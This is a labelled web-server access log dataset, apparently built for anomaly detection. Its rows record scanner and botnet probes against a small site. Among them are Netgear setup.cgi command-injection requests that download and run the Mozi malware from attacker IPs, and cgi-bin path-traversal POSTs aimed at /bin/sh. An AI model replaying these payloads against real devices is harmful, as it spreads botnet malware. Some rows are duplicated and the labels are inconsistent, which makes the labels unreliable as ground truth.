ip,date,method,endpoint,status,size,flag
125.229.134.120,17/Nov/2024:15:53:55 +0000,GET,/,200,1755.0,normal
152.42.243.111,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
152.42.243.111,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
149.50.106.25,17/Nov/2024:16:54:02 +0000,GET,/,200,1755.0,normal
95.214.55.79,17/Nov/2024:17:26:14 +0000,GET,/,200,1755.0,normal
206.168.34.43,17/Nov/2024:17:47:01 +0000,GET,/,200,1755.0,normal
185.191.126.248,17/Nov/2024:18:01:20 +0000,GET,/,200,1755.0,normal
199.45.154.146,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0,anomaly
199.45.154.146,17/Nov/2024:18:16:51 +0000,GET,/,200,1755.0,normal
199.45.154.146,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0,anomaly
92.255.57.150,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0,anomaly
172.104.11.34,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0,anomaly
205.210.31.18,17/Nov/2024:22:51:17 +0000,GET,/,200,1755.0,normal
95.214.53.91,17/Nov/2024:22:52:45 +0000,GET,/,200,1755.0,normal
159.223.67.34,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
65.49.20.66,18/Nov/2024:03:19:59 +0000,GET,/,200,1755.0,normal
65.49.20.66,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0,anomaly
185.191.126.248,18/Nov/2024:05:00:12 +0000,GET,/,200,1755.0,normal
185.191.126.248,18/Nov/2024:06:43:04 +0000,GET,/,200,1755.0,normal
5.35.104.31,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
93.174.93.12,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
152.42.214.140,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
159.223.67.34,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
159.223.67.34,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
178.128.54.126,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
95.214.53.205,18/Nov/2024:10:05:14 +0000,GET,/,200,1755.0,normal
194.50.16.198,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
164.52.24.188,18/Nov/2024:14:34:03 +0000,GET,/,200,1755.0,normal
164.52.24.188,18/Nov/2024:14:34:06 +0000,GET,/,200,1755.0,normal
164.52.24.188,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0,anomaly
164.52.24.188,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0,anomaly
46.174.191.32,18/Nov/2024:14:41:18 +0000,GET,/,200,1755.0,normal
152.42.243.206,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
80.82.77.202,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
93.174.93.12,18/Nov/2024:21:01:30 +0000,GET,/,200,1755.0,normal
95.214.53.205,18/Nov/2024:21:45:35 +0000,GET,/,200,1755.0,normal
205.210.31.220,18/Nov/2024:22:14:12 +0000,GET,/,200,1755.0,normal
93.174.93.12,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
159.223.69.51,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
47.254.76.138,19/Nov/2024:01:18:33 +0000,GET,/,200,1755.0,normal
47.89.193.239,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0,anomaly
114.35.175.166,19/Nov/2024:02:23:21 +0000,GET,/,200,1755.0,normal
167.94.138.43,19/Nov/2024:03:57:47 +0000,GET,/,200,1755.0,normal
167.94.138.43,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0,anomaly
5.8.11.202,19/Nov/2024:05:48:02 +0000,GET,/,200,1755.0,normal
2.57.122.209,19/Nov/2024:06:12:10 +0000,GET,/,200,1755.0,normal
2.57.122.209,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0,anomaly
205.210.31.19,19/Nov/2024:07:40:53 +0000,GET,/,200,1755.0,normal
5.8.11.202,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
152.42.214.50,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
152.42.214.140,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
95.214.55.79,19/Nov/2024:11:17:32 +0000,GET,/,200,1755.0,normal
81.161.238.40,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0,anomaly
5.8.11.202,19/Nov/2024:11:46:16 +0000,GET,/,200,1755.0,normal
95.214.53.205,19/Nov/2024:14:03:31 +0000,GET,/,200,1755.0,normal
139.162.164.128,19/Nov/2024:14:23:31 +0000,GET,/,200,1755.0,normal
185.85.239.13,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0,anomaly
194.50.16.198,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0,anomaly
185.209.120.5,19/Nov/2024:16:48:00 +0000,GET,/,200,1755.0,normal
185.209.120.5,19/Nov/2024:16:48:00 +0000,GET,/styles.css,200,1716.0,normal
185.209.120.5,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0,anomaly
185.209.120.5,19/Nov/2024:17:25:43 +0000,GET,/,304,,normal
185.209.120.5,19/Nov/2024:18:01:45 +0000,GET,/,200,1755.0,normal
185.209.120.5,19/Nov/2024:18:01:45 +0000,GET,/styles.css,200,1716.0,normal
95.214.53.205,19/Nov/2024:18:47:00 +0000,GET,/,200,1755.0,normal
125.82.242.94,19/Nov/2024:20:16:26 +0000,,-,408,,anomaly
194.50.16.198,19/Nov/2024:21:30:47 +0000,GET,/,200,1755.0,normal
205.210.31.8,19/Nov/2024:22:20:38 +0000,GET,/,200,1755.0,normal
198.235.24.143,19/Nov/2024:22:25:03 +0000,GET,/,200,1755.0,normal
95.214.53.205,19/Nov/2024:23:10:41 +0000,GET,/,200,1755.0,normal
106.75.65.201,20/Nov/2024:01:18:37 +0000,GET,/,200,1755.0,normal
106.75.65.201,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0,anomaly
106.75.65.201,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0,anomaly
58.208.68.190,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0,anomaly
45.84.89.3,20/Nov/2024:01:56:56 +0000,GET,/,200,1755.0,normal
65.49.1.45,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0,anomaly
5.79.184.27,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0,anomaly
5.8.11.202,20/Nov/2024:03:45:10 +0000,GET,/,200,1755.0,normal
1.34.111.115,20/Nov/2024:03:53:37 +0000,GET,/,200,1755.0,normal
92.249.48.208,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0,anomaly
194.50.16.198,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0,anomaly
185.191.126.248,20/Nov/2024:05:23:19 +0000,GET,/,200,1755.0,normal
46.174.191.32,20/Nov/2024:05:47:13 +0000,GET,/,200,1755.0,normal
93.174.93.12,20/Nov/2024:06:28:46 +0000,GET,/,200,1755.0,normal
152.42.214.140,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
92.255.57.58,20/Nov/2024:10:18:25 +0000,GET,/,200,1755.0,normal
92.255.57.58,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0,anomaly
92.255.57.58,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0,anomaly
95.214.55.79,20/Nov/2024:12:59:43 +0000,GET,/,200,1755.0,normal
139.59.101.104,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
95.214.53.205,20/Nov/2024:13:42:45 +0000,GET,/,200,1755.0,normal
95.214.53.205,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
185.209.120.11,20/Nov/2024:15:27:54 +0000,GET,/,200,1755.0,normal
185.209.120.11,20/Nov/2024:15:27:54 +0000,GET,/styles.css,200,1716.0,normal
185.209.120.11,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0,anomaly
185.209.120.11,20/Nov/2024:15:27:57 +0000,GET,/,304,,normal
185.209.120.11,20/Nov/2024:15:28:05 +0000,GET,/,200,1755.0,normal
185.209.120.11,20/Nov/2024:15:28:05 +0000,GET,/styles.css,200,1716.0,normal
185.209.120.11,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0,anomaly
194.50.16.198,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
104.209.35.51,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0,anomaly
5.8.11.202,20/Nov/2024:18:01:36 +0000,GET,/,200,1755.0,normal
5.8.11.202,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
95.214.53.205,20/Nov/2024:18:58:40 +0000,GET,/,200,1755.0,normal
172.105.78.45,20/Nov/2024:20:17:49 +0000,GET,/,200,1755.0,normal
95.214.53.205,20/Nov/2024:20:40:49 +0000,GET,/,200,1755.0,normal
81.214.143.203,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0,anomaly
95.214.53.205,20/Nov/2024:21:48:02 +0000,GET,/,200,1755.0,normal
5.8.11.202,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
167.94.145.100,21/Nov/2024:01:27:57 +0000,GET,/,200,1755.0,normal
170.64.239.33,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0,anomaly
170.64.239.33,21/Nov/2024:03:13:00 +0000,GET,/,200,1755.0,normal
170.64.239.33,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0,anomaly
170.64.239.33,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0,anomaly
170.64.239.33,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0,anomaly
170.64.239.33,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0,anomaly
45.84.89.2,21/Nov/2024:04:56:39 +0000,GET,/,200,1755.0,normal
80.82.70.133,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
80.82.77.202,21/Nov/2024:06:58:16 +0000,GET,/,200,1755.0,normal
5.8.11.202,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0,anomaly
5.8.11.202,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0,anomaly
5.8.11.202,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0,anomaly
167.94.138.52,21/Nov/2024:07:00:58 +0000,GET,/,200,1755.0,normal
95.214.53.205,21/Nov/2024:07:20:59 +0000,GET,/,200,1755.0,normal
93.174.93.12,21/Nov/2024:07:32:52 +0000,GET,/,200,1755.0,normal
159.223.69.51,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
37.140.242.61,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
37.140.242.61,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0,anomaly
80.82.77.202,21/Nov/2024:10:32:12 +0000,GET,/,200,1755.0,normal
47.245.119.234,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
125.228.198.247,21/Nov/2024:12:55:04 +0000,GET,/,200,1755.0,normal
95.214.55.43,21/Nov/2024:13:39:45 +0000,GET,/,200,1755.0,normal
95.214.53.205,21/Nov/2024:14:02:38 +0000,GET,/,200,1755.0,normal
95.214.53.205,21/Nov/2024:14:44:17 +0000,GET,/,200,1755.0,normal
152.42.247.210,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
45.156.128.57,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0,anomaly
45.156.128.56,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0,anomaly
103.73.183.186,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0,anomaly
5.8.11.202,21/Nov/2024:17:52:14 +0000,GET,/,200,1755.0,normal
93.174.93.12,21/Nov/2024:20:18:46 +0000,GET,/,200,1755.0,normal
185.82.219.179,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0,anomaly
46.174.191.28,21/Nov/2024:22:34:07 +0000,GET,/,200,1755.0,normal
194.50.16.198,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0,anomaly
93.174.93.12,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
47.237.132.148,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
173.255.221.189,22/Nov/2024:04:01:54 +0000,GET,/,200,1755.0,normal
172.104.11.34,22/Nov/2024:04:02:00 +0000,GET,/,200,1755.0,normal
205.210.31.134,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0,anomaly
87.120.115.119,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0,anomaly
45.84.89.2,22/Nov/2024:07:24:07 +0000,GET,/,200,1755.0,normal
114.34.240.137,22/Nov/2024:08:26:14 +0000,GET,/,200,1755.0,normal
159.223.69.51,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
152.42.243.206,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
152.42.243.206,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
5.8.11.202,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
205.210.31.143,22/Nov/2024:09:24:09 +0000,GET,/,200,1755.0,normal
178.20.129.78,22/Nov/2024:10:10:46 +0000,GET,/,200,1755.0,normal
159.89.172.232,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0,anomaly
209.38.98.23,22/Nov/2024:10:15:23 +0000,GET,/,200,1755.0,normal
185.191.126.248,22/Nov/2024:10:33:31 +0000,GET,/,200,1755.0,normal
95.214.55.43,22/Nov/2024:10:40:26 +0000,GET,/,200,1755.0,normal
80.82.77.202,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
148.153.56.82,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0,anomaly
64.62.156.69,22/Nov/2024:13:22:40 +0000,GET,/,200,1755.0,normal
64.62.156.71,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0,anomaly
205.210.31.143,22/Nov/2024:09:24:09 +0000,GET,/,200,1755.0,normal
178.20.129.78,22/Nov/2024:10:10:46 +0000,GET,/,200,1755.0,normal
159.89.172.232,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0,anomaly
209.38.98.23,22/Nov/2024:10:15:23 +0000,GET,/,200,1755.0,normal
185.191.126.248,22/Nov/2024:10:33:31 +0000,GET,/,200,1755.0,normal
95.214.55.43,22/Nov/2024:10:40:26 +0000,GET,/,200,1755.0,normal
80.82.77.202,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
148.153.56.82,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0,anomaly
64.62.156.69,22/Nov/2024:13:22:40 +0000,GET,/,200,1755.0,normal
64.62.156.71,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0,normal
185.191.126.248,22/Nov/2024:17:16:25 +0000,POST,/boaform/admin/formLogin,404,196.0,anomaly
24.25.141.252,22/Nov/2024:18:28:26 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://24.25.141.252:37270/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0,anomaly
206.168.34.34,22/Nov/2024:18:34:49 +0000,GET,/,200,1755.0,normal
5.8.11.202,22/Nov/2024:21:19:11 +0000,GET,/,200,1755.0,normal
34.76.56.248,23/Nov/2024:01:12:52 +0000,GET,/,200,1755.0,normal
46.174.191.29,23/Nov/2024:01:26:21 +0000,GET,/,200,1755.0,normal
93.174.93.12,23/Nov/2024:03:39:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
5.8.11.202,23/Nov/2024:04:04:01 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
162.142.125.45,23/Nov/2024:06:14:34 +0000,GET,/,200,1755.0,normal
162.142.125.45,23/Nov/2024:06:14:39 +0000,GET,/,200,1755.0,normal
47.237.132.128,23/Nov/2024:06:27:39 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
95.214.53.205,23/Nov/2024:06:29:58 +0000,GET,/,200,1755.0,normal
36.134.42.220,23/Nov/2024:08:28:31 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
36.134.42.220,23/Nov/2024:08:28:34 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0,anomaly
102.212.40.131,23/Nov/2024:11:11:35 +0000,POST,/GponForm/diag_Form?images/,404,196.0,anomaly
51.158.205.47,23/Nov/2024:13:07:09 +0000,GET,/,200,1755.0,normal
80.82.77.202,23/Nov/2024:13:59:37 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
82.50.37.227,23/Nov/2024:15:17:48 +0000,GET,/,200,1755.0,normal
52.189.75.157,23/Nov/2024:15:57:04 +0000,GET,/actuator/health,404,196.0,anomaly
194.50.16.198,23/Nov/2024:18:26:44 +0000,GET,/login.asp,404,196.0,anomaly
125.228.88.11,23/Nov/2024:21:50:48 +0000,GET,/,200,1755.0,normal
206.168.34.113,24/Nov/2024:00:36:32 +0000,GET,/,200,1755.0,normal
206.168.34.113,24/Nov/2024:00:36:32 +0000,GET,/favicon.ico,404,196.0,normal
129.126.117.32,24/Nov/2024:01:45:01 +0000,GET,/,200,1755.0,normal
81.161.238.40,24/Nov/2024:05:30:47 +0000,GET,/.env,404,196.0,anomaly
185.191.126.248,24/Nov/2024:05:43:01 +0000,GET,/,200,1755.0,normal
5.8.11.202,24/Nov/2024:05:49:23 +0000,GET,/,200,1755.0,normal
80.82.77.202,24/Nov/2024:09:08:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
152.42.243.111,24/Nov/2024:09:28:03 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
185.85.239.13,24/Nov/2024:10:23:47 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0,anomaly
114.35.11.75,24/Nov/2024:12:20:35 +0000,GET,/,200,1755.0,normal
162.142.125.217,24/Nov/2024:13:08:34 +0000,,\x16\x03\x01,400,226.0,anomaly
162.142.125.217,24/Nov/2024:13:08:37 +0000,GET,/,200,1755.0,normal
13.91.165.194,24/Nov/2024:13:14:46 +0000,GET,/portal/redlion,404,196.0,anomaly
92.255.57.58,24/Nov/2024:13:18:02 +0000,POST,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,404,196.0,anomaly
92.255.57.58,24/Nov/2024:14:26:32 +0000,GET,/,200,1755.0,normal
167.94.145.105,24/Nov/2024:15:39:20 +0000,GET,/,200,1755.0,normal
167.94.145.105,24/Nov/2024:15:39:24 +0000,GET,/,200,1755.0,normal
167.94.145.105,24/Nov/2024:15:39:24 +0000,GET,/favicon.ico,404,196.0,normal
178.128.54.126,24/Nov/2024:16:34:48 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
152.42.214.50,24/Nov/2024:16:35:55 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
152.42.214.50,24/Nov/2024:16:36:00 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
34.76.96.55,24/Nov/2024:18:05:05 +0000,GET,/,200,1755.0,normal
194.50.16.198,24/Nov/2024:19:03:13 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
9.168.29.98,15/Nov/2024:00:35:31 +0000,,-,408,,anomaly
165.237.95.138,15/Nov/2024:00:36:08 +0000,,-,408,,anomaly
50.249.87.238,15/Nov/2024:00:36:30 +0000,,-,408,,anomaly
139.93.10.196,15/Nov/2024:00:36:34 +0000,,stats,400,226.0,anomaly
